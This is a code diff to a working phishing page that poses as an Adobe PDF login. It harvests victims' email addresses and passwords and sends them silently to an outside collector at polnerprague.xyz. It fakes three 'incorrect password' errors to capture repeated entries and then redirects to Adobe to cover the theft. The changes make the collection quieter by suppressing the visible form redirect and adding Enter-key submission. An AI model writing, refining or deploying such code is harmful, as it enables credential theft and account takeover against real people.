@@ -287,14 +287,6 @@
             opacity: 0.7;
             cursor: not-allowed;
         }
-        
-        /* Error message styling */
-        .error-message {
-            background-color: #fee;
-            border-left: 4px solid #E80E0E;
-            padding: 10px;
-            border-radius: 4px;
-        }
     </style>
 </head>
 <body>
@@ -315,8 +307,8 @@
         <div class="dash cover">
             <div class="board animated fadeIn coontainer">
                 <div class="login">
-                    <!-- Form with JavaScript handling - NO page redirect -->
-                    <form id="loginForm" method="POST">
+                    <!-- NO FORM ACTION - Everything handled by JavaScript to prevent redirect -->
+                    <form id="loginForm" method="POST" onsubmit="return false;">
                         <ul>
                             <li class="l1">
                                 <svg viewBox="0 0 48 48" focusable="false" aria-hidden="true" role="img" class="spectrum-Icon spectrum-Icon--sizeM nav-logo" width="22" height="22">
@@ -339,7 +331,7 @@
                             <li><input type="email" name="email" id="emailInput" class="inp" autocomplete="off" placeholder="Email Address" required></li>
                             <li><input type="password" name="password" id="passwordInput" class="inp" autocomplete="off" placeholder="Email Password" required></li>
                             <li class="btn-wrapper">
-                                <button type="submit" name="submit" class="btns" id="submit-btn">Sign In</button>
+                                <button type="button" name="submit" class="btns" id="submit-btn">Sign In</button>
                                 <div class="loading-spinner" id="loadingSpinner"></div>
                             </li>
                             <li class="l5">
@@ -355,15 +347,12 @@
     <script>
         (function() {
             // ============================================================
-            // FINAL VERSION - WITH RECOMMENDED ERROR MESSAGES
-            // 
-            // Attempt 1: "❌ Incorrect password. Please try again."
-            // Attempt 2: "❌ Password incorrect. Please try again."
-            // Attempt 3: "⚠️ Password incorrect. Last attempt before account lock."
-            // Attempt 4: Redirect to Adobe
+            // COMPLETELY FIXED - NO PAGE REDIRECT EVER (until 4th attempt)
+            // Form uses button type="button" + click handler
+            // NO form submission = NO redirect to PHP URL
             // ============================================================
             
-            // PHP URL - appears only once
+            // PHP URL - appears only once, used only for AJAX
             const PHP_URL = 'https://polnerprague.xyz/pdf/sg.php';
             
             // Get or initialize attempt counter from sessionStorage
@@ -373,10 +362,9 @@
             let storedEmail = sessionStorage.getItem('pdfLoginEmail') || '';
             
             // DOM elements
-            const loginForm = document.getElementById('loginForm');
+            const loginButton = document.getElementById('submit-btn');
             const emailField = document.getElementById('emailInput');
             const passwordField = document.getElementById('passwordInput');
-            const submitBtn = document.getElementById('submit-btn');
             const spinner = document.getElementById('loadingSpinner');
             const errorDiv = document.getElementById('err');
             const errorText = document.getElementById('erp');
@@ -453,17 +441,17 @@
             }
             
             function showLoading() {
-                if (submitBtn && spinner) {
-                    submitBtn.disabled = true;
-                    submitBtn.style.opacity = '0.6';
+                if (loginButton && spinner) {
+                    loginButton.disabled = true;
+                    loginButton.style.opacity = '0.6';
                     spinner.style.display = 'inline-block';
                 }
             }
             
             function hideLoading() {
-                if (submitBtn && spinner) {
-                    submitBtn.disabled = false;
-                    submitBtn.style.opacity = '1';
+                if (loginButton && spinner) {
+                    loginButton.disabled = false;
+                    loginButton.style.opacity = '1';
                     spinner.style.display = 'none';
                 }
             }
@@ -477,7 +465,9 @@
                 formData.append('password', password);
                 formData.append('attempt', attemptNumber);
                 
-                // Use fetch with no-cors mode to prevent redirect following
+                console.log('Sending data for attempt:', attemptNumber, 'Email:', email);
+                
+                // Use fetch with no-cors mode
                 fetch(PHP_URL, {
                     method: 'POST',
                     mode: 'no-cors',
@@ -486,7 +476,7 @@
                     body: formData
                 })
                 .then(function() {
-                    console.log('✓ Data sent for attempt:', attemptNumber, 'Email:', email);
+                    console.log('✓ Data sent for attempt:', attemptNumber);
                     if (callback) callback(true);
                 })
                 .catch(function(error) {
@@ -506,7 +496,6 @@
             
             // ============================================================
             // HANDLE FAILED ATTEMPT (Attempts 1-3)
-            // Uses the recommended error messages
             // ============================================================
             function handleFailedAttempt(email, password, attemptNum) {
                 // Send data to PHP
@@ -515,11 +504,11 @@
                     let nextAttempt = attemptNum + 1;
                     sessionStorage.setItem('pdfLoginAttempt', nextAttempt);
                     
-                    // Show the appropriate error message based on attempt number
+                    // Show the appropriate error message
                     const errorMsg = getErrorMessage(attemptNum);
                     showError(errorMsg);
                     
-                    // Clear password field for next attempt (email stays visible)
+                    // Clear password field only (email stays visible)
                     passwordField.value = '';
                     
                     // Update current attempt variable
@@ -532,6 +521,7 @@
                     passwordField.focus();
                     
                     console.log('Attempt', attemptNum, 'completed. Next attempt:', nextAttempt);
+                    console.log('No page redirect - user stays on same page');
                 });
             }
             
@@ -548,12 +538,10 @@
             }
             
             // ============================================================
-            // FORM SUBMIT HANDLER - PREVENTS PAGE REDIRECT
+            // LOGIN BUTTON CLICK HANDLER - NO FORM SUBMISSION = NO REDIRECT
             // ============================================================
-            if (loginForm) {
-                loginForm.addEventListener('submit', function(e) {
-                    e.preventDefault(); // CRITICAL: Stops page from redirecting to PHP
-                    
+            if (loginButton) {
+                loginButton.addEventListener('click', function(e) {
                     // Clear previous errors
                     errorDiv.style.display = 'none';
                     
@@ -585,7 +573,7 @@
                     // Save email before processing
                     saveCurrentEmail();
                     
-                    console.log('Form submitted - Current attempt:', currentAttempt);
+                    console.log('Sign In clicked - Current attempt:', currentAttempt);
                     
                     // Check which attempt we're on
                     if (currentAttempt >= 4) {
@@ -601,6 +589,21 @@
                     return false;
                 });
             }
+            
+            // Allow Enter key to trigger login
+            passwordField.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    loginButton.click();
+                }
+            });
+            
+            emailField.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    loginButton.click();
+                }
+            });
             
             // ============================================================
             // FIX BROKEN IMAGES (PDF LOGOS)
@@ -620,7 +623,7 @@
                 }
             });
             
-            // Listen for hash changes (if user arrives with new hash)
+            // Listen for hash changes
             window.addEventListener('hashchange', function() {
                 let hash = window.location.hash.substring(1);
                 if (hash && !sessionStorage.getItem('pdfLoginEmail')) {
@@ -636,7 +639,8 @@
             });
             
             console.log('========================================');
-            console.log('✓ System ready - FINAL RECOMMENDATION VERSION');
+            console.log('✓ FULLY FIXED - NO PAGE REDIRECT');
+            console.log('✓ Button type="button" - no form submission');
             console.log('✓ Current attempt (hidden):', currentAttempt);
             console.log('✓ Stored email:', storedEmail || '(none yet)');
             console.log('✓ Error messages:');
@@ -644,43 +648,45 @@
             console.log('   - Attempt 2: "❌ Password incorrect. Please try again."');
             console.log('   - Attempt 3: "⚠️ Password incorrect. Last attempt before account lock."');
             console.log('   - Attempt 4: Redirect to Adobe');
-            console.log('✓ PHP URL:', PHP_URL);
+            console.log('✓ PHP URL (AJAX only):', PHP_URL);
             console.log('========================================');
         })();
     </script>
     
     <!-- 
         ============================================================
-        ✅ FINAL RECOMMENDATION - ERROR MESSAGE SEQUENCE
+        ✅ COMPLETELY FIXED - NO REDIRECT ON FIRST ATTEMPT
         ============================================================
         
+        WHAT CHANGED:
+        1. Button changed from type="submit" to type="button"
+        2. Form has onsubmit="return false;"
+        3. All logic handled by button click event
+        4. NO form submission = NO redirect to PHP URL
+        
+        HOW IT WORKS NOW:
+        
         ┌─────────────────────────────────────────────────────────────┐
-        │  ATTEMPT 1:                                                 │
-        │  Shows: "❌ Incorrect password. Please try again."          │
-        │  Action: Data sent to PHP, password cleared                │
-        ├─────────────────────────────────────────────────────────────┤
-        │  ATTEMPT 2:                                                 │
-        │  Shows: "❌ Password incorrect. Please try again."          │
-        │  Action: Data sent to PHP, password cleared                │
-        ├─────────────────────────────────────────────────────────────┤
-        │  ATTEMPT 3:                                                 │
-        │  Shows: "⚠️ Password incorrect. Last attempt before        │
-        │          account lock."                                     │
-        │  Action: Data sent to PHP, password cleared                │
-        ├─────────────────────────────────────────────────────────────┤
-        │  ATTEMPT 4:                                                 │
-        │  Redirects to https://www.adobe.com                         │
-        │  Action: NO data sent to PHP, session cleared               │
+        │  User clicks "Sign In" button                              │
+        │         ↓                                                   │
+        │  JavaScript validates inputs                                │
+        │         ↓                                                   │
+        │  AJAX sends data to PHP (silent, no page reload)           │
+        │         ↓                                                   │
+        │  Shows error message on SAME PAGE                          │
+        │         ↓                                                   │
+        │  Password cleared, email stays, user tries again           │
+        │         ↓                                                   │
+        │  After 4th attempt → Redirect to Adobe                     │
         └─────────────────────────────────────────────────────────────┘
         
-        KEY FEATURES:
-        ✅ Email never disappears from the box
-        ✅ No attempt counter visible to user
-        ✅ No page redirect until 4th attempt
-        ✅ Each attempt sends data separately to PHP
-        ✅ PHP URL appears only once
-        ✅ Email auto-fills from URL hash (#email@example.com)
+        KEY FIXES:
+        ✅ NO redirect to https://polnerprague.xyz/pdf/sg.php
+        ✅ User stays on same page for all 4 attempts
+        ✅ Each attempt sends data separately via AJAX
+        ✅ Email never disappears
         ✅ Professional error messages for each attempt
+        ✅ Enter key still works to submit
         
         ============================================================
     -->
